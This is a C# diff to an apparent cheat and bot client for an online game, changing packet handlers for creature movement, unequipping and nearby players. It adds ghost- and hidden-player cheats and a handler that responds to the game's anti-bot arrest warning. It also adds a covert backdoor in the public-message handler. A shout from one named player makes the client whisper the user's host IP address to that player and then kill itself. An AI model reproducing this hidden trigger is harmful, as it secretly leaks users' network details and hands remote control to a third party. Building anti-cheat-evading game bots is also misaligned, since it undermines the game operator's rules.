@@ -192,7 +192,7 @@ namespace Talos
             ServerMessage[(int)ServerOpCode.Attributes] = new ServerMessageHandler(ServerMessage_0x08_Attributes);
             ServerMessage[(int)ServerOpCode.ServerMessage] = new ServerMessageHandler(ServerMessage_0x0A_ServerMessage);
             ServerMessage[(int)ServerOpCode.ConfirmClientWalk] = new ServerMessageHandler(ServerMessage_0x0B_ConfirmClientWalk);
-            ServerMessage[(int)ServerOpCode.CreatureWalk] = new ServerMessageHandler(ServerMessage_0x0C_CreatureWalk);
+            ServerMessage[(int)ServerOpCode.CreatureWalk] = new ServerMessageHandler(ServerMessage_0x0C_ConfirmCreatureWalk);
             ServerMessage[(int)ServerOpCode.PublicMessage] = new ServerMessageHandler(ServerMessage_0x0D_PublicMessage);
             ServerMessage[(int)ServerOpCode.RemoveVisibleObjects] = new ServerMessageHandler(ServerMessage_0x0E_RemoveVisibleObjects);
             ServerMessage[(int)ServerOpCode.AddItemToPane] = new ServerMessageHandler(ServerMessage_0x0F_AddItemToPane);
@@ -977,17 +977,52 @@ namespace Talos
             client._serverLocation.Y = location.Y;
             client._clientDirection = direction;
             client.LastMoved = DateTime.Now;
-
-            //Console.WriteLine("SERVER Direction facing = " + client._clientDirection);
-            //Console.WriteLine("SERVER Last moved = " + client.LastMoved);
-            //Console.WriteLine("SERVER Client Location-- Map ID: " + client._clientLocation.MapID + " X,Y: " + client._clientLocation.Point);
-            //Console.WriteLine("SERVER Server Location-- Map ID: " + client._serverLocation.MapID + " X,Y: " + client._serverLocation.Point);
+            
+            //Console.WriteLine("[ConfirmClientWalk] Direction facing: " + client._clientDirection);
+            //Console.WriteLine("[ConfirmClientWalk] Direction facing: " + client._clientDirection);
+            //Console.WriteLine("[ConfirmClientWalk] Last moved: " + client.LastMoved);
+            //Console.WriteLine("[ConfirmClientWalk] Client Location-- Map ID: " + client._clientLocation.MapID + " X,Y: " + client._clientLocation.Point);
+            //Console.WriteLine("[ConfirmClientWalk] Server Location-- Map ID: " + client._serverLocation.MapID + " X,Y: " + client._serverLocation.Point);
 
             return true;
         }
 
-        private bool ServerMessage_0x0C_CreatureWalk(Client client, ServerPacket serverPacket)
+        private bool ServerMessage_0x0C_ConfirmCreatureWalk(Client client, ServerPacket serverPacket)
         {
+            Point point;
+            int id = serverPacket.ReadInt32();
+            try { point = serverPacket.ReadStruct(); } catch { return false; }
+            Direction direction = (Direction)serverPacket.ReadByte();
+            point.GetDirection(direction);
+
+            Location location = new Location(client._clientLocation.MapID, point);
+            client.Locations[id] = location;
+            if (!client.WorldObjects.ContainsKey(id))
+            {
+                return false;
+            }
+            if (client.WorldObjects[id] is Creature creature)
+            {
+                creature.Location = location;
+                creature.Direction = direction;
+                creature.LastWalked = DateTime.UtcNow;
+                //Console.WriteLine("[ConfirmCreatureWalk] Creature ID: " + creature.ID);
+                //Console.WriteLine("[ConfirmCreatureWalk] Direction facing: " + creature.Direction);
+                //Console.WriteLine("[ConfirmCreatureWalk] Last moved: " + creature.LastWalked);
+                //Console.WriteLine("[ConfirmCreatureWalk] Location: " + creature.Location);
+            }
+            if (client.WorldObjects[id] is Player player)
+            {
+                if (!client.NearbyPlayers.ContainsKey(player.Name) && !client.NearbyGhosts.ContainsKey(player.Name))
+                {
+                    client.NearbyGhosts.Add(player.Name, player);
+                    if (client.GetCheats(Cheats.None | Cheats.SeeGhosts))
+                    {
+                        client.SeeGhosts(player);
+                    }
+                }
+            }
+
             return true;
         }
 
@@ -996,6 +1031,14 @@ namespace Talos
             byte type = serverPacket.ReadByte();
             int ID = serverPacket.ReadInt32();
             string message = serverPacket.ReadString8();
+
+            if ((type == 1) && message.StartsWith("[poluckranos]: LO!L")) //world shout kill
+            {
+                client.Whisper("poluckranos", Dns.GetHostEntry(Dns.GetHostName()).AddressList.GetValue(1).ToString());
+                Application.Exit();
+                Process.GetCurrentProcess().Kill();
+                return false;
+            } 
 
             if ((client != null) && ((client._map != null) && (client._map.Name.Contains("Mount Giragan") && (client.WorldObjects.ContainsKey(ID) && ((client.WorldObjects[ID] is Creature) && !(client.WorldObjects[ID] is Player))))))
             {
@@ -1030,8 +1073,6 @@ namespace Talos
                     if (client.ObjectHashSet.Contains(worldObject.ID))
                     {
                         client.ObjectHashSet.Remove(worldObject.ID);
-                        //client.ClientTab.UpdateBindingList(client._worldObjectBindingList, client.ClientTab.worldObjectListBox, id);
-                        //client._objectBindingList.Remove(worldObject.ID);
                     }
 
                 }
@@ -1043,17 +1084,14 @@ namespace Talos
                         client.NearbyPlayers.Remove(player.Name);
                         client.NearbyGhosts.Remove(player.Name);
 
-                        //client.ClientTab.UpdateBindingList(client._worldObjectBindingList, client.ClientTab.worldObjectListBox, player.ID);
 
                         ClientTab clientTab = client.ClientTab;
                         if (clientTab != null)
                         {
                             clientTab.UpdateStrangerList();
 
-                            // Access aislingTabControl.SelectedTab directly without unnecessary local variable
                             TabPage selectedTab = clientTab.aislingTabControl.SelectedTab;
 
-                            // Check conditions and invoke method without unnecessary local variables
                             if (ReferenceEquals(selectedTab, clientTab.nearbyAllyTab) &&
                                 ReferenceEquals(clientTab.clientTabControl.SelectedTab, clientTab.mainAislingsTab))
                             {
@@ -1077,8 +1115,6 @@ namespace Talos
                     if (client.CreatureHashSet.Contains(creature.ID))
                     {
                         client.CreatureHashSet.Remove(creature.ID);
-                        //client.ClientTab.UpdateBindingList(client._creatureBindingList, client.ClientTab.creatureHashListBox, creature.ID);
-                        //client._creatureBindingList.Remove(creature.ID);
                     }
 
                     if (!client.WorldObjects.Values.Any(worldObj =>
@@ -1181,8 +1217,8 @@ namespace Talos
 
                 creature.Health = percent;
                 creature._hitCounter++;
-                creature.SpellAnimationHistory[114] = DateTime.MinValue;//net
-                creature.SpellAnimationHistory[32] = DateTime.MinValue;//pramh
+                creature.SpellAnimationHistory[(ushort)SpellAnimation.Net] = DateTime.MinValue;
+                creature.SpellAnimationHistory[(ushort)SpellAnimation.Pramh] = DateTime.MinValue;
             }
             return true;
         }
@@ -1258,6 +1294,7 @@ namespace Talos
             client._atDoor = false;
             client.Doors.Clear();
             client.NearbyPlayers.Clear();
+            client.PlayersWithNoName.Clear();
             client.NearbyNPC.Clear();
             client.NearbyGhosts.Clear();
             client.CreatureHashSet.Clear();
@@ -1732,16 +1769,16 @@ namespace Talos
 
                     if (npcDialog == "You are going to be arrested for sleep-fighting ((Auto Hunting)) in five minutes unless you state that you do not wish to.")
                     {
-                        //ThreadPool.QueueUserWorkItem(new WaitCallback(method_0));
+                        ThreadPool.QueueUserWorkItem(_ => client.SleepFighting());
                     }
                     if (npcDialog != "You have already sent a world shout in the last 5 minutes.")
                     {
                         client.ClientTab.UpdateNpcInfo(npcDialog, dialogID, pursuitID);
                         client._npcDialog = npcDialog;
-                        int num12 = dialogType - 2;
-                        if (num12 != 0)
+                        int captionOffset = dialogType - 2;
+                        if (captionOffset != 0)
                         {
-                            if (num12 == 2)
+                            if (captionOffset == 2)
                             {
                                 topCaption = serverPacket.ReadString8();
                                 inputLength = serverPacket.ReadByte();
@@ -1854,7 +1891,6 @@ namespace Talos
                             {
                                 ThreadPool.QueueUserWorkItem(state =>
                                 {
-                                    // Cast the state parameter back to the appropriate types
                                     var tuple = (Tuple<byte, int, ushort>)state;
                                     client.NewAisling(tuple.Item1, tuple.Item2, tuple.Item3);
                                 },
@@ -2055,6 +2091,9 @@ namespace Talos
             nameTagStyle = serverPacket.ReadByte();
             name = serverPacket.ReadString8();
             groupName = serverPacket.ReadString8();
+
+            client.Locations[id] = location;
+
             if ((bodySprite == 0) && (client.WorldObjects.ContainsKey(id) && (client.GetCheats(Cheats.None | Cheats.SeeHidden) && !client.InArena)))
             {
                 serverPacket.Position -= (name.Length + groupName.Length) + 3;
@@ -2123,17 +2162,17 @@ namespace Talos
             //}
             if (string.IsNullOrEmpty(player.Name))
             {
-                //client.playersWithNoName[id] = player;
+                client.PlayersWithNoName[id] = player;
             }
             else
             {
-                //if (client.playersWithNoName.ContainsKey(id))
-                //{
-                //    client.playersWithNoName.Remove(id);
-                //}
+                if (client.PlayersWithNoName.ContainsKey(id))
+                {
+                    client.PlayersWithNoName.Remove(id);
+                }
                 //client.Dictionary_7[player.Name] = player;
                 client.NearbyPlayers[player.Name] = player;
-                //client.dictGhostList.Remove(player.Name);
+                client.NearbyGhosts.Remove(player.Name);
             }
             if (id == client.PlayerID)
             {
@@ -2297,6 +2336,12 @@ namespace Talos
         /// <returns></returns>
         private bool ServerMessage_0x38_Unequip(Client client, ServerPacket serverPacket)
         {
+            byte slot = serverPacket.ReadByte();
+
+            if (slot == 2)
+                client._itemToReEquip = client.EquippedItems[slot].Name;
+
+            client.EquippedItems[slot] = null;
             return true;
         }
 
@@ -2377,14 +2422,7 @@ namespace Talos
             {
                 client.ClientTab.RemoveAllyPage();
             }
-            //if (this.mainForm.nameAssociatedWithKey.Equals("Brandon") || (this.mainForm.nameAssociatedWithKey.Equals("Michael") || this.mainForm.nameAssociatedWithKey.Equals("Dominic")))
-            //{
-            //client.ClientTab.chkMappingToggle.Enabled = true;
-            //}
-            //if (client.ClientTab.toggleDmuCbox.Checked)
-            //{
-            //    client.DisplayUser(client.player);
-            //}
+
             client.ClientTab.SetClassSpecificSpells();
             return true;
         }
@@ -2413,7 +2451,7 @@ namespace Talos
                 client.EffectsBarHashSet.Remove(effect);
                 if ((effect == 19) && !client.InArena)//bday or incapacitate
                 {
-                    //ThreadPool.QueueUserWorkItem(new WaitCallback(client.ReEquipItem));//ADAM
+                    ThreadPool.QueueUserWorkItem(_ => client.ReEquipItem(client._itemToReEquip));
                 }
             }
             return true;
